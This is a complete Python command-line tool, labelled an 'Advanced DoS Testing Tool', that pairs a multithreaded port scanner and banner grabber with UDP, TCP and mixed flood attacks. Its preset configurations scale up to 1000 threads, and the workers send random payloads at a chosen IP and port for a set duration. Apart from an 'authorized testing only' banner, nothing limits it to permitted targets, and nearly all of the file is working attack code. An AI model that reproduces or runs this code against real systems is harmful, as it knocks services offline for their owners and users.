#!/usr/bin/env python3
"""
Advanced DoS Testing Tool - For Authorized Penetration Testing Only
"""

import socket
import threading
import time
import random
import ssl
import struct
import ipaddress
import argparse
import sys
import json
import logging
from urllib.parse import urlparse
from cmd import Cmd
from colorama import Fore, Style, init
from datetime import datetime
import concurrent.futures

# Initialize colorama for cross-platform colored text
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class PortScanner:
    """Advanced port scanner with service detection"""
    
    # Common service ports
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 
        110: "POP3", 143: "IMAP", 389: "LDAP", 443: "HTTPS", 445: "SMB", 
        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle DB", 1812: "RADIUS",
        2082: "cPanel", 2083: "cPanel SSL", 2222: "DirectAdmin", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 5985: "WinRM", 5986: "WinRM SSL",
        8000: "HTTP-Alt", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 9000: "Jenkins", 
        10000: "Webmin"
    }
    
    def __init__(self):
        self.timeout = 2
        self.max_threads = 100
        self.open_ports = []
        self.scanning = False
        
    def scan_target(self, target, port_range=None, scan_type="common"):
        """
        Scan target for open ports
        
        Args:
            target: IP address or hostname
            port_range: tuple (start, end) or list of ports
            scan_type: "common", "top100", "full", "auth", "custom"
        """
        self.open_ports = []
        self.scanning = True
        
        print(Fore.YELLOW + f"Starting port scan on {target}...")
        
        # Determine ports to scan
        ports_to_scan = self._get_ports_to_scan(port_range, scan_type)
        
        print(Fore.CYAN + f"Scanning {len(ports_to_scan)} ports with {self.max_threads} threads...")
        
        start_time = time.time()
        
        # Threaded port scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(self._check_port, target, port): port for port in ports_to_scan}
            
            for future in concurrent.futures.as_completed(futures):
                if not self.scanning:
                    break
                port = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.open_ports.append(result)
                except Exception as e:
                    pass
        
        scan_time = time.time() - start_time
        self._display_results(target, scan_time)
        return self.open_ports
    
    def _get_ports_to_scan(self, port_range, scan_type):
        """Determine which ports to scan based on type"""
        if scan_type == "common":
            return list(self.COMMON_PORTS.keys())[:50]
        elif scan_type == "top100":
            common_ports = [1,3,7,9,13,21,22,23,25,26,37,53,79,80,81,88,106,110,111,113,119,135,139,143,144,179,199,389,427,443,444,445,465,513,514,515,543,544,548,554,587,631,646,873,990,993,995,1025,1026,1027,1028,1029,1110,1433,1720,1723,1755,1900,2000,2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000,6001,6646,7070,8000,8008,8009,8080,8081,8443,8888,9100,9999,10000,32768,49152,49153,49154,49155,49156,49157]
            return common_ports[:100]
        elif scan_type == "auth":
            return [port for port, service in self.COMMON_PORTS.items() if any(auth_keyword in service for auth_keyword in ['SSH', 'TELNET', 'LDAP', 'RADIUS', 'RDP', 'VNC', 'WinRM', 'cPanel', 'DirectAdmin', 'Webmin'])]
        elif scan_type == "full":
            return list(range(1, 1001))
        elif scan_type == "custom" and port_range:
            if isinstance(port_range, tuple):
                return list(range(port_range[0], port_range[1] + 1))
            elif isinstance(port_range, list):
                return port_range
        else:
            return list(self.COMMON_PORTS.keys())[:50]
    
    def _check_port(self, target, port):
        """Check if a specific port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                service = self.COMMON_PORTS.get(port, "Unknown")
                banner = self._get_banner(target, port)
                return (port, service, banner)
        except:
            pass
        return None
    
    def _get_banner(self, target, port, timeout=3):
        """Attempt to grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target, port))
            
            if port in [21, 22, 25, 80, 110, 143, 443, 993, 995]:
                if port == 80 or port == 443 or port == 8080 or port == 8443:
                    sock.send(b"GET / HTTP/1.0\r\n\r\n")
                elif port == 22:
                    sock.send(b"SSH-2.0-Client\r\n")
                elif port == 25:
                    sock.send(b"EHLO example.com\r\n")
                
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner[:200]
        except:
            return "No banner"
    
    def _display_results(self, target, scan_time):
        """Display scan results"""
        print(Fore.GREEN + f"\nPort scan completed in {scan_time:.2f} seconds")
        print(Fore.GREEN + f"Found {len(self.open_ports)} open ports on {target}\n")
        
        if self.open_ports:
            print(Fore.CYAN + "PORT     SERVICE     BANNER")
            print(Fore.CYAN + "-" * 50)
            for port, service, banner in sorted(self.open_ports):
                port_color = Fore.GREEN if service != "Unknown" else Fore.YELLOW
                print(f"{port_color}{port:<9}{service:<12}{banner}")
        else:
            print(Fore.RED + "No open ports found")
    
    def stop_scan(self):
        """Stop the ongoing scan"""
        self.scanning = False

class AttackStatistics:
    """Track and display attack statistics"""
    def __init__(self):
        self.start_time = None
        self.packets_sent = 0
        self.packets_failed = 0
        self.bytes_sent = 0
        self.connections_made = 0
        self.lock = threading.Lock()
    
    def start(self):
        self.start_time = datetime.now()
    
    def update(self, packets=0, bytes=0, connections=0, failed=0):
        with self.lock:
            self.packets_sent += packets
            self.bytes_sent += bytes
            self.connections_made += connections
            self.packets_failed += failed
    
    def get_stats(self):
        if not self.start_time:
            return "No attack running"
        
        duration = datetime.now() - self.start_time
        hours, remainder = divmod(duration.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        return {
            'duration': f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}",
            'packets_sent': self.packets_sent,
            'packets_failed': self.packets_failed,
            'bytes_sent': self.bytes_sent,
            'connections_made': self.connections_made,
            'packets_per_second': self.packets_sent / duration.total_seconds() if duration.total_seconds() > 0 else 0
        }

class AdvancedDoSTool(Cmd):
    """
    Advanced DoS Testing Tool with Multiple Attack Vectors
    """
    
    prompt = Fore.CYAN + '(dos-tool) ' + Style.RESET_ALL
    intro = Fore.GREEN + r"""
╔══════════════════════════════════════════════════════════════╗
║                Advanced DoS Testing Tool                     ║
║               Now with Regular Flood Attacks                 ║
║                                                              ║
║               FOR AUTHORIZED TESTING ONLY!                   ║
╚══════════════════════════════════════════════════════════════╝
Type 'help' to see available commands
""" + Style.RESET_ALL
    
    def __init__(self):
        super().__init__()
        self.target_ip = None
        self.target_port = None
        self.target_url = None
        self.attack_threads = []
        self.attack_running = False
        self.thread_count = 50
        self.packet_size = 1024
        self.attack_duration = 0
        self.current_attack_type = None
        self.stats = AttackStatistics()
        self.port_scanner = PortScanner()
        self.user_agents = self._load_user_agents()
        
    def _load_user_agents(self):
        """Load realistic user agents"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        ]

    # PORT SCANNING METHODS (keep all existing port scanning methods)
    def do_port_scan(self, args):
        """Port scanning - Usage: port_scan [target] [type] [ports]"""
        args = args.split()
        target = self.target_ip
        scan_type = "common"
        port_range = None
        
        try:
            if len(args) >= 1:
                if self._is_ip_or_hostname(args[0]):
                    target = args[0]
                    if len(args) >= 2:
                        scan_type = args[1]
                else:
                    scan_type = args[0]
            
            if len(args) >= 3:
                if ',' in args[2]:
                    port_range = [int(p) for p in args[2].split(',')]
                elif '-' in args[2]:
                    start, end = map(int, args[2].split('-'))
                    port_range = (start, end)
                else:
                    port_range = [int(args[2])]
            
            if not target:
                print(Fore.RED + "No target specified. Use: port_scan <IP> [type] or set_target first")
                return
            
            valid_types = ["common", "top100", "auth", "full", "custom"]
            if scan_type not in valid_types:
                print(Fore.RED + f"Invalid scan type. Choose from: {', '.join(valid_types)}")
                return
            
            if scan_type == "custom" and not port_range:
                print(Fore.RED + "Custom scan requires port range")
                return
            
            print(Fore.YELLOW + f"Starting {scan_type} port scan on {target}...")
            open_ports = self.port_scanner.scan_target(target, port_range, scan_type)
            
            if open_ports:
                response = input(Fore.CYAN + "\nSet target to first open port? (y/n): ").lower()
                if response == 'y':
                    port = open_ports[0][0]
                    self.target_ip = target
                    self.target_port = port
                    print(Fore.GREEN + f"Target set to {target}:{port}")
            
        except Exception as e:
            print(Fore.RED + f"Port scan error: {e}")

    def do_scan_common_auth(self, args):
        """Quick scan for common authentication ports"""
        if not self.target_ip and not args:
            print(Fore.RED + "No target specified. Use: scan_common_auth <IP> or set_target first")
            return
        
        target = self.target_ip if not args else args.split()[0]
        if not self._is_ip_or_hostname(target):
            print(Fore.RED + "Invalid target IP/hostname")
            return
        
        print(Fore.YELLOW + f"Scanning common authentication ports on {target}...")
        self.port_scanner.scan_target(target, scan_type="auth")

    def do_scan_full(self, args):
        """Full port scan (1-1000) - Usage: scan_full [target]"""
        if not self.target_ip and not args:
            print(Fore.RED + "No target specified. Use: scan_full <IP> or set_target first")
            return
        
        target = self.target_ip if not args else args.split()[0]
        if not self._is_ip_or_hostname(target):
            print(Fore.RED + "Invalid target IP/hostname")
            return
        
        print(Fore.YELLOW + f"Starting full port scan on {target} (ports 1-1000)...")
        self.port_scanner.scan_target(target, port_range=(1, 1000), scan_type="full")

    def do_stop_scan(self, args):
        """Stop ongoing port scan"""
        self.port_scanner.stop_scan()
        print(Fore.YELLOW + "Port scan stopped")

    def _is_ip_or_hostname(self, target):
        """Check if string is a valid IP or hostname"""
        try:
            ipaddress.ip_address(target)
            return True
        except:
            try:
                socket.gethostbyname(target)
                return True
            except:
                return False

    # NEW REGULAR FLOOD ATTACK METHODS
    def do_flood(self, args):
        """Regular flood attack - simple and effective"""
        if not self.target_ip or not self.target_port:
            print(Fore.RED + "Please set target first using 'set_target'")
            return
            
        if self.attack_running:
            print(Fore.RED + "Attack is already running")
            return
            
        print(Fore.YELLOW + f"Starting regular flood attack on {self.target_ip}:{self.target_port}...")
        print(Fore.CYAN + f"Threads: {self.thread_count}, Packet size: {self.packet_size} bytes")
        self._start_attack("flood")

    def do_udp_flood(self, args):
        """UDP flood attack - connectionless and fast"""
        if not self.target_ip or not self.target_port:
            print(Fore.RED + "Please set target first using 'set_target'")
            return
            
        if self.attack_running:
            print(Fore.RED + "Attack is already running")
            return
            
        print(Fore.YELLOW + f"Starting UDP flood attack on {self.target_ip}:{self.target_port}...")
        print(Fore.CYAN + f"Threads: {self.thread_count}, Packet size: {self.packet_size} bytes")
        self._start_attack("udp_flood")

    def do_tcp_flood(self, args):
        """TCP flood attack - connection-based"""
        if not self.target_ip or not self.target_port:
            print(Fore.RED + "Please set target first using 'set_target'")
            return
            
        if self.attack_running:
            print(Fore.RED + "Attack is already running")
            return
            
        print(Fore.YELLOW + f"Starting TCP flood attack on {self.target_ip}:{self.target_port}...")
        print(Fore.CYAN + f"Threads: {self.thread_count}, Packet size: {self.packet_size} bytes")
        self._start_attack("tcp_flood")

    def _flood_worker(self, thread_id):
        """Worker for regular flood attack - mixes TCP and UDP"""
        start_time = time.time()
        packet_count = 0
        
        while self.attack_running:
            try:
                # Alternate between TCP and UDP for variety
                use_udp = random.choice([True, False])
                
                if use_udp:
                    # UDP flood - faster, connectionless
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    payload = random._urandom(self.packet_size)
                    sock.sendto(payload, (self.target_ip, self.target_port))
                    sock.close()
                    self.stats.update(packets=1, bytes=len(payload))
                else:
                    # TCP flood - connection-based
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    self.stats.update(connections=1)
                    
                    # Send multiple packets per connection
                    for _ in range(random.randint(1, 5)):
                        payload = random._urandom(self.packet_size)
                        sock.send(payload)
                        self.stats.update(packets=1, bytes=len(payload))
                    
                    sock.close()
                
                packet_count += 1
                
                # Progress reporting
                if thread_id == 0 and time.time() - start_time >= 2:
                    stats = self.stats.get_stats()
                    if isinstance(stats, dict):
                        mbps = (stats['bytes_sent'] / (1024*1024)) / (time.time() - self.stats.start_time.timestamp())
                        print(Fore.GREEN + f"Flooding: {stats['packets_sent']} packets, {mbps:.1f} MB/s")
                    start_time = time.time()
                    
            except Exception as e:
                self.stats.update(failed=1)
            
            # Dynamic delay based on thread count (more threads = less delay)
            delay = max(0.001, 0.1 - (self.thread_count / 1000))
            time.sleep(delay)

    def _udp_flood_worker(self, thread_id):
        """Worker for UDP-only flood attack"""
        start_time = time.time()
        
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(self.packet_size)
                sock.sendto(payload, (self.target_ip, self.target_port))
                sock.close()
                self.stats.update(packets=1, bytes=len(payload))
                
                # High-speed UDP can go faster
                if thread_id == 0 and time.time() - start_time >= 2:
                    stats = self.stats.get_stats()
                    if isinstance(stats, dict):
                        pps = stats['packets_per_second']
                        print(Fore.CYAN + f"UDP Flood: {pps:.0f} packets/sec")
                    start_time = time.time()
                    
            except Exception as e:
                self.stats.update(failed=1)
            
            # Very short delay for UDP flood
            time.sleep(0.001)

    def _tcp_flood_worker(self, thread_id):
        """Worker for TCP-only flood attack"""
        start_time = time.time()
        
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target_ip, self.target_port))
                self.stats.update(connections=1)
                
                # Send multiple packets per connection
                for _ in range(random.randint(3, 10)):
                    payload = random._urandom(self.packet_size)
                    sock.send(payload)
                    self.stats.update(packets=1, bytes=len(payload))
                
                sock.close()
                
                if thread_id == 0 and time.time() - start_time >= 2:
                    stats = self.stats.get_stats()
                    if isinstance(stats, dict):
                        print(Fore.BLUE + f"TCP Flood: {stats['connections_made']} connections")
                    start_time = time.time()
                    
            except Exception as e:
                self.stats.update(failed=1)
            
            time.sleep(0.01)

    # CONFIGURATION METHODS
    def do_standard_config(self, args):
        """Apply standard DoS configuration"""
        print(Fore.YELLOW + "Applying standard configuration...")
        self.thread_count = 150
        self.packet_size = 512
        self.attack_duration = 300
        print(Fore.GREEN + "Standard config: 150 threads, 512 byte packets, 300s duration")

    def do_strong_config(self, args):
        """Apply strong configuration for robust targets"""
        print(Fore.YELLOW + "Applying strong configuration...")
        self.thread_count = 500
        self.packet_size = 1024
        self.attack_duration = 600
        print(Fore.GREEN + "Strong config: 500 threads, 1024 byte packets, 600s duration")

    def do_ultra_config(self, args):
        """Apply ultra configuration for maximum power"""
        print(Fore.RED + "Applying ULTRA configuration...")
        self.thread_count = 1000
        self.packet_size = 1460
        self.attack_duration = 900
        print(Fore.RED + "ULTRA config: 1000 threads, 1460 byte packets, 900s duration")

    # EXISTING METHODS (keep all your existing methods)
    def do_set_target(self, args):
        """Set the target - Usage: set_target <IP> <PORT> or set_target <URL>"""
        try:
            args = args.split()
            if len(args) == 1:
                if args[0].startswith(('http://', 'https://')):
                    parsed = urlparse(args[0])
                    self.target_url = args[0]
                    self.target_ip = parsed.hostname
                    self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                    print(Fore.GREEN + f"URL target set: {args[0]}")
                    print(Fore.GREEN + f"Resolved to: {self.target_ip}:{self.target_port}")
                else:
                    self.target_ip = args[0]
                    print(Fore.GREEN + f"IP target set: {args[0]} (port not set)")
            elif len(args) == 2:
                self.target_ip = args[0]
                self.target_port = int(args[1])
                print(Fore.GREEN + f"Target set: {self.target_ip}:{self.target_port}")
            else:
                print(Fore.RED + "Usage: set_target <IP> <PORT> or set_target <URL>")
        except ValueError:
            print(Fore.RED + "Invalid port number")
        except Exception as e:
            print(Fore.RED + f"Error: {e}")

    def do_set_threads(self, args):
        """Set number of threads - Usage: set_threads <COUNT>"""
        try:
            count = int(args)
            if 1 <= count <= 10000:
                self.thread_count = count
                print(Fore.GREEN + f"Thread count set to: {count}")
            else:
                print(Fore.RED + "Thread count must be between 1-10000")
        except ValueError:
            print(Fore.RED + "Invalid thread count")

    def do_set_packet_size(self, args):
        """Set packet size in bytes - Usage: set_packet_size <SIZE>"""
        try:
            size = int(args)
            if 1 <= size <= 65535:
                self.packet_size = size
                print(Fore.GREEN + f"Packet size set to: {size} bytes")
            else:
                print(Fore.RED + "Packet size must be between 1-65535")
        except ValueError:
            print(Fore.RED + "Invalid packet size")

    def do_set_duration(self, args):
        """Set attack duration in seconds - Usage: set_duration <SECONDS>"""
        try:
            duration = int(args)
            if duration >= 0:
                self.attack_duration = duration
                if duration == 0:
                    print(Fore.GREEN + "Attack duration set to: Unlimited")
                else:
                    print(Fore.GREEN + f"Attack duration set to: {duration} seconds")
            else:
                print(Fore.RED + "Duration must be >= 0")
        except ValueError:
            print(Fore.RED + "Invalid duration")

    def do_test_connection(self, args):
        """Test connectivity to target"""
        if not self.target_ip or not self.target_port:
            print(Fore.RED + "Please set target first using 'set_target'")
            return
        
        print(Fore.YELLOW + f"Testing connection to {self.target_ip}:{self.target_port}...")
        try:
            start_time = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            connect_time = (time.time() - start_time) * 1000
            
            sock.settimeout(2)
            try:
                banner = sock.recv(1024)
                print(Fore.GREEN + f"Connected! Response time: {connect_time:.2f}ms")
                if banner:
                    print(Fore.CYAN + f"Banner: {banner.decode('utf-8', errors='ignore')[:200]}")
            except socket.timeout:
                print(Fore.GREEN + f"Connected! Response time: {connect_time:.2f}ms (No banner)")
            
            sock.close()
        except Exception as e:
            print(Fore.RED + f"Connection failed: {e}")

    def do_show_config(self, args):
        """Show current configuration"""
        print(Fore.YELLOW + "Current Configuration:")
        print(Fore.YELLOW + f"  Target: {self.target_ip or 'Not set'}:{self.target_port or 'Not set'}")
        if self.target_url:
            print(Fore.YELLOW + f"  URL: {self.target_url}")
        print(Fore.YELLOW + f"  Threads: {self.thread_count}")
        print(Fore.YELLOW + f"  Packet Size: {self.packet_size} bytes")
        print(Fore.YELLOW + f"  Duration: {self.attack_duration if self.attack_duration > 0 else 'Unlimited'}s")
        print(Fore.YELLOW + f"  Attack running: {self.attack_running}")
        if self.current_attack_type:
            print(Fore.YELLOW + f"  Current attack: {self.current_attack_type}")

    def do_show_stats(self, args):
        """Show current attack statistics"""
        stats = self.stats.get_stats()
        if isinstance(stats, str):
            print(Fore.YELLOW + stats)
        else:
            print(Fore.CYAN + "Attack Statistics:")
            print(Fore.CYAN + f"  Duration: {stats['duration']}")
            print(Fore.CYAN + f"  Packets Sent: {stats['packets_sent']}")
            print(Fore.CYAN + f"  Packets Failed: {stats['packets_failed']}")
            print(Fore.CYAN + f"  Bytes Sent: {stats['bytes_sent']} ({stats['bytes_sent'] / (1024*1024):.2f} MB)")
            print(Fore.CYAN + f"  Connections Made: {stats['connections_made']}")
            print(Fore.CYAN + f"  Packets/Second: {stats['packets_per_second']:.2f}")

    def _start_attack(self, attack_type, **kwargs):
        """Start attack with specified type"""
        self.attack_running = True
        self.current_attack_type = attack_type
        self.stats.start()
        
        # Create attack threads
        if attack_type == "flood":
            target = self._flood_worker
        elif attack_type == "udp_flood":
            target = self._udp_flood_worker
        elif attack_type == "tcp_flood":
            target = self._tcp_flood_worker
        else:
            target = self._flood_worker  # Default to regular flood
        
        for i in range(self.thread_count):
            thread = threading.Thread(target=target, args=(i,))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        # Start monitoring
        stats_thread = threading.Thread(target=self._stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        if self.attack_duration > 0:
            timer_thread = threading.Thread(target=self._attack_timer)
            timer_thread.daemon = True
            timer_thread.start()
        
        print(Fore.GREEN + f"{attack_type.replace('_', ' ').title()} attack started!")

    def _stats_monitor(self):
        """Monitor and display statistics periodically"""
        while self.attack_running:
            time.sleep(5)
            stats = self.stats.get_stats()
            if isinstance(stats, dict):
                mbps = (stats['bytes_sent'] / (1024*1024)) / (datetime.now().timestamp() - self.stats.start_time.timestamp())
                print(Fore.CYAN + f"Stats: {stats['packets_sent']} packets, {mbps:.1f} MB/s, {stats['packets_per_second']:.1f} p/s")

    def _attack_timer(self):
        """Timer for limited duration attacks"""
        time.sleep(self.attack_duration)
        if self.attack_running:
            print(Fore.YELLOW + f"Attack duration reached, stopping...")
            self.do_stop_attack("")

    def do_stop_attack(self, args):
        """Stop all attacks"""
        if not self.attack_running:
            print(Fore.RED + "No attack is running")
            return
            
        self.attack_running = False
        self.attack_threads = []
        self.current_attack_type = None
        time.sleep(1)
        
        stats = self.stats.get_stats()
        if isinstance(stats, dict):
            print(Fore.GREEN + "Attack stopped. Final stats:")
            self.do_show_stats("")
        else:
            print(Fore.GREEN + "Attack stopped!")

    def do_quit(self, args):
        """Exit the program"""
        if self.attack_running:
            self.do_stop_attack("")
        print(Fore.RED + "Exiting...")
        return True

    def do_exit(self, args):
        """Exit the program"""
        return self.do_quit(args)

    def do_clear(self, args):
        """Clear the screen"""
        print("\n" * 100)

    def precmd(self, line):
        if line.lower() in ['q', 'quit', 'exit']:
            return 'quit'
        return line

    def emptyline(self):
        pass

    def default(self, line):
        print(Fore.RED + f"Unknown command: {line}. Type 'help' for available commands.")

def main():
    parser = argparse.ArgumentParser(description='Advanced DoS Testing Tool')
    parser.add_argument('--target', '-t', help='Target IP:PORT or URL')
    parser.add_argument('--threads', '-n', type=int, default=50, help='Number of threads')
    parser.add_argument('--attack', '-a', choices=['flood', 'udp_flood', 'tcp_flood'], help='Attack type')
    
    args = parser.parse_args()
    
    try:
        tool = AdvancedDoSTool()
        
        if args.target:
            tool.do_set_target(args.target)
        if args.threads:
            tool.thread_count = args.threads
        
        if args.attack and tool.target_ip and tool.target_port:
            if args.attack == 'flood':
                tool.do_flood("")
            elif args.attack == 'udp_flood':
                tool.do_udp_flood("")
            elif args.attack == 'tcp_flood':
                tool.do_tcp_flood("")
        else:
            tool.cmdloop()
            
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted by user. Exiting...")
    except Exception as e:
        print(Fore.RED + f"Unexpected error: {e}")

if __name__ == '__main__':
    main()